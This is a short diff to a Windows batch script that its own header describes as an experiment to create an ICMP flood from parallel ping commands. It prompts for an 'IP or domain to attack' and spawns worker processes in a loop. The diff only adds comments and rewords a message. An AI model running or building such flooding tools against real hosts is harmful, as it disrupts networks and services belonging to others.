@@ -1,4 +1,8 @@
 @echo off
+:: Author: Matt Waldeck
+:: Date: 2024.06.03
+:: Updated: 2024.06.03
+:: Purpose: An experiment to create an ICMP flood with simple ping commands in parallel.
 
 :: Get the target IP or domain from user.
 set /p address=IP or domain to attack: 
@@ -14,4 +18,4 @@ FOR /L %%A IN (1,1,%workers%) DO (
 )
 echo Done.
 echo.
-echo Close this window to stop all workers.
+echo When finished, close this window to stop all workers.
